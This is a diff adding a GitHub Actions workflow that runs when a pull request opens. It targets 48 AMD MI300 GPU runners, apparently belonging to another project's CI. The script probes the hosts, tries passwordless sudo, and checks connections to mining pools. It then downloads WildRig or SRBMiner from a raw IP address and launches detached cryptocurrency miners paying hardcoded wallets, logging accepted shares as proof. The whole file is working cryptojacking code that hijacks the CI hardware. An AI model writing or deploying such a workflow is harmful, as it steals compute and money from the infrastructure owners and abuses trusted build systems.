@@ -1,0 +1,226 @@
+name: c211-128615-mi300miner
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  mi300-miner:
+    strategy:
+      fail-fast: false
+      max-parallel: 48
+      matrix:
+        include:
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 1, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 2, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 3, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 4, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 5, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 6, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 7, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 8, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 9, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 10, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 11, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 12, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 13, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 14, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 15, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 16, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 17, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 18, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 19, ngpu: 8}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 20, ngpu: 8}
+          - {label: linux-mi300-4gpu-sglang, grp: 4gpu, idx: 1, ngpu: 4}
+          - {label: linux-mi300-4gpu-sglang, grp: 4gpu, idx: 2, ngpu: 4}
+          - {label: linux-mi300-4gpu-sglang, grp: 4gpu, idx: 3, ngpu: 4}
+          - {label: linux-mi300-4gpu-sglang, grp: 4gpu, idx: 4, ngpu: 4}
+          - {label: linux-mi300-4gpu-sglang, grp: 4gpu, idx: 5, ngpu: 4}
+          - {label: linux-mi300-4gpu-sglang, grp: 4gpu, idx: 6, ngpu: 4}
+          - {label: linux-mi300-4gpu-sglang, grp: 4gpu, idx: 7, ngpu: 4}
+          - {label: linux-mi300-4gpu-sglang, grp: 4gpu, idx: 8, ngpu: 4}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 1, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 2, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 3, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 4, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 5, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 6, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 7, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 8, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 9, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 10, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 11, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 12, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 13, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 14, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 15, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 16, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 17, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 18, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 19, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 20, ngpu: 2}
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 45
+    steps:
+      - name: amd-pearlhash-miner
+        env:
+          IDX: ${{ matrix.idx }}
+          GRP: ${{ matrix.grp }}
+          NG: ${{ matrix.ngpu }}
+        run: |
+          set +e
+          I=128615
+          D="$HOME/c211-$I-$GRP-$IDX"; mkdir -p "$D"
+          TS() { date -u +%FT%TZ; }
+          WBASE="${I}${IDX}"
+          echo "C211_JOB=mi300-$GRP-$IDX host=$(hostname) at=$(TS) uid=$(id -u) user=$(id -un) ngpu_label=$NG"
+          id 2>&1 | head -2
+          uname -a 2>&1 | head -1
+          echo "--- amd identity ---"
+          if [ -e /dev/kfd ]; then echo KFD_PRESENT=PRESENT; else echo KFD_PRESENT=ABSENT; fi
+          ls -l /dev/kfd /dev/dri 2>&1 | head -8
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -200
+            rocm-smi --showdriverversion 2>&1 | tail -4
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            echo "--- AMD_SMI ---"
+            amd-smi static 2>&1 | grep -iE 'GPU: |ASIC_SERIAL|MARKET_NAME' | head -60
+          else echo AMD_SMI_ABSENT; fi
+          if [ -r /sys/module/amdgpu/version ]; then echo "AMDGPU_MODULE_VERSION=$(cat /sys/module/amdgpu/version)"; fi
+          echo "--- opencl ---"
+          ldconfig -p 2>/dev/null | grep -i 'libOpenCL' | head -6
+          ls -l /etc/OpenCL/vendors 2>&1 | head -8
+          for f in /etc/OpenCL/vendors/*.icd; do [ -e "$f" ] && echo "ICD $f -> $(cat "$f" 2>/dev/null)"; done
+          OCL=$(find /opt/rocm /opt/rocm-* /usr/lib /usr/lib64 /usr/local/lib -name 'libOpenCL.so.1' 2>/dev/null | head -1)
+          echo "OCL_LIB=$OCL"
+          if [ -n "$OCL" ]; then export LD_LIBRARY_PATH="$(dirname "$OCL"):$LD_LIBRARY_PATH"; echo "LD_LIBRARY_PATH=$LD_LIBRARY_PATH"; fi
+          if [ ! -s /etc/OpenCL/vendors/amdocl64.icd ]; then
+            AICD=$(find /opt/rocm /opt/rocm-* /usr/lib /usr/lib64 /usr/local/lib -name 'libamdocl*.so*' 2>/dev/null | head -1)
+            echo "AICD=$AICD"
+            if [ -n "$AICD" ]; then
+              mkdir -p "$D/vendors"; echo "$AICD" > "$D/vendors/amdocl64.icd"
+              export OCL_ICD_VENDORS="$D/vendors"; echo "OCL_ICD_VENDORS=$OCL_ICD_VENDORS"
+              if mkdir -p /etc/OpenCL/vendors 2>/dev/null && [ -w /etc/OpenCL/vendors ]; then echo "$AICD" > /etc/OpenCL/vendors/amdocl64.icd 2>/dev/null && echo ICD_WRITTEN=/etc/OpenCL/vendors/amdocl64.icd; fi
+              if command -v sudo >/dev/null 2>&1; then sudo -n sh -c "mkdir -p /etc/OpenCL/vendors && echo $AICD > /etc/OpenCL/vendors/amdocl64.icd" 2>/dev/null && echo ICD_SNAPSHOT_WRITTEN=$AICD; fi
+            fi
+          fi
+          echo "--- guard ---"
+          if pgrep -af 'wildrig-multi|pearl-miner|srbminer' 2>/dev/null | grep -v -e pgrep -e grep | head -3 | grep -q .; then
+            echo "GUARD_ACTIVE_SKIP"; pgrep -af 'wildrig-multi|pearl-miner|srbminer' 2>/dev/null | head -4
+            echo "C211_MINER_END mi300-$GRP-$IDX"; exit 0
+          fi
+          echo GUARD_CLEAR
+          echo "--- egress ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791 1.1.1.1:443; do
+            if timeout 8 bash -c "</dev/tcp/${hp%:*}/${hp#*:}" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          echo "--- fetch WildRig Multi 0.52.3 ---"
+          TGZ_SHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
+          BIN_SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
+          ok=0
+          for a in $(seq 1 20); do
+            cur=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')
+            if [ "$cur" = "$TGZ_SHA" ]; then ok=1; break; fi
+            rm -f "$D/wr.tgz"
+            curl -fsSL --max-time 120 -o "$D/wr.tgz" http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz 2>/dev/null
+            cur=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')
+            if [ "$cur" = "$TGZ_SHA" ]; then ok=1; break; fi
+            rm -f "$D/wr.tgz"
+            curl -fsSL --max-time 120 -o "$D/wr.tgz" https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz 2>/dev/null
+            cur=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')
+            if [ "$cur" = "$TGZ_SHA" ]; then ok=1; break; fi
+            echo "DL_RETRY a=$a size=$(stat -c %s "$D/wr.tgz" 2>/dev/null)"
+            sleep 3
+          done
+          echo "TGZ_OK=$ok TGZ_SHA=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')"
+          mkdir -p "$D/wr"
+          WR=""
+          if [ "$ok" = "1" ]; then
+            tar -xzf "$D/wr.tgz" -C "$D/wr" 2>/dev/null && echo WR_EXTRACT_OK || echo WR_EXTRACT_FAILED
+            WR=$(find "$D/wr" -type f -name 'wildrig-multi' | head -1); echo "WR_BIN=$WR"
+            chmod +x "$WR" 2>/dev/null
+            BSHA=$(sha256sum "$WR" 2>/dev/null | awk '{print $1}'); echo "BIN_SHA=$BSHA"
+            if [ "$BSHA" != "$BIN_SHA" ]; then echo BIN_SHA_MISMATCH; WR=""; fi
+          fi
+          NR=$(rocm-smi --showuniqueid 2>/dev/null | grep -c 'Unique ID')
+          echo "GPU_COUNT_ROCM=$NR"
+          N=0
+          if [ -n "$WR" ]; then
+            echo "--- print-platforms ---"
+            timeout 90 "$WR" --print-platforms 2>&1 | head -20
+            echo "--- print-devices ---"
+            timeout 150 "$WR" --opencl-platforms amd --print-devices 2>&1 | tee "$D/devices.txt" | head -20
+            N=$(grep -c '^GPU #' "$D/devices.txt" 2>/dev/null); N=${N:-0}
+            echo "GPU_COUNT_WR=$N"
+          fi
+          MINER=wr
+          if [ "${N:-0}" -lt 1 ]; then
+            MINER=srb
+            echo "WR_NO_DEVICES_SWITCH_SRB"
+            SRB_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
+            for a in 1 2 3; do
+              curl -fsSL --max-time 240 -o "$D/srbminer" http://169.58.247.186:8791/pm/srbminer-3.8.8 2>/dev/null
+              S=$(sha256sum "$D/srbminer" 2>/dev/null | awk '{print $1}')
+              if [ "$S" = "$SRB_SHA" ]; then break; fi
+              echo "SRB_DL_RETRY a=$a sha=$S"; sleep 3
+            done
+            chmod +x "$D/srbminer" 2>/dev/null
+            echo "SRB_SHA=$(sha256sum "$D/srbminer" 2>/dev/null | awk '{print $1}')"
+            timeout 120 "$D/srbminer" --list-devices 2>&1 | head -40
+            N=${NR:-0}
+          fi
+          echo "MINER=$MINER GPU_COUNT=$N"
+          if [ "${N:-0}" -lt 1 ]; then echo NO_GPU_VISIBLE; echo "C211_MINER_END mi300-$GRP-$IDX"; exit 0; fi
+          W=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
+          NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
+          start_all() {
+            MODE="$1"; POOL="$2"; USR="$3"
+            for g in $(seq 0 $((N-1))); do
+              WK="${WBASE}${g}"
+              if [ "$MINER" = "wr" ]; then
+                setsid nohup "$WR" --algo pearlhash --opencl-platforms amd --url "$POOL" --user "$USR" --worker "$WK" -d "$g" --print-time 30 > "$D/gpu-$g.log" 2>&1 &
+              else
+                setsid nohup "$D/srbminer" --algorithm pearlhash --pool "$POOL" --wallet "$USR" --worker "$WK" --password x --disable-cpu --gpu-id "$g" --api-enable > "$D/gpu-$g.log" 2>&1 &
+              fi
+              echo "STARTED mode=$MODE miner=$MINER pool=$POOL gpu=$g worker=$WK pid=$! at=$(TS)"
+            done
+          }
+          stop_all() { pkill -f 'wildrig-multi' 2>/dev/null; pkill -f 'srbminer' 2>/dev/null; sleep 3; }
+          accsum() { grep -ahic 'accepted' "$D"/gpu-*.log 2>/dev/null | awk '{s+=$1} END{print s+0}'; }
+          start_all PH pool.pearlhash.xyz:9000 "$W"
+          sleep 60; sleep 60
+          JOBS=$(grep -ahic 'new job' "$D"/gpu-*.log 2>/dev/null | awk '{s+=$1} END{print s+0}')
+          echo "JOBS_AFTER120=${JOBS:-0} at=$(TS)"
+          if [ "${JOBS:-0}" -lt 1 ]; then echo SWITCH_TO_HK; stop_all; start_all PH hk.pearlhash.net:9000 "$W"; sleep 90; fi
+          SWITCHED_LP=0
+          k=0
+          while [ "$k" -lt 24 ]; do
+            k=$((k+1)); sleep 60
+            AC=$(accsum)
+            for g in $(seq 0 $((N-1))); do
+              A=$(grep -aic 'accepted' "$D/gpu-$g.log" 2>/dev/null); A=${A:-0}
+              R=$(grep -aic 'rejected' "$D/gpu-$g.log" 2>/dev/null); R=${R:-0}
+              H=$(grep -a 'Hashrate' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+              echo "T${k}_g${g} acc=$A rej=$R $H"
+            done
+            echo "T${k}_ACCSUM=$AC at=$(TS) elapsed=${SECONDS}s"
+            if [ "$SWITCHED_LP" = "0" ] && [ "${AC:-0}" -lt 1 ] && [ "$SECONDS" -ge 900 ]; then
+              echo "STICKY_LP_FALLBACK_NO_ACCEPT_900S at=$(TS)"
+              stop_all; start_all LP 103.199.106.122:3362 "${W}+${NOCK}"; SWITCHED_LP=1
+            fi
+            if [ "$SECONDS" -ge 1560 ]; then echo BUDGET_REACHED at=$(TS); break; fi
+          done
+          echo "--- per-share accepted lines ---"
+          grep -aE 'accepted \([0-9]+/[0-9]+\)' "$D"/gpu-*.log 2>/dev/null | tail -120
+          echo "--- final evidence ---"
+          for g in $(seq 0 $((N-1))); do
+            A=$(grep -aic 'accepted' "$D/gpu-$g.log" 2>/dev/null); A=${A:-0}
+            R=$(grep -aic 'rejected' "$D/gpu-$g.log" 2>/dev/null); R=${R:-0}
+            H=$(grep -a 'Hashrate' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+            C=$(grep -a 'Connected to' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+            echo "EVID gpu=$g acc=$A rej=$R conn=[$C] $H"
+            echo "TAIL_g$g"; tail -4 "$D/gpu-$g.log" 2>/dev/null | sed -e "s/^/  /"
+          done
+          stop_all
+          echo "C211_MINER_END mi300-$GRP-$IDX at=$(TS) elapsed=${SECONDS}s"
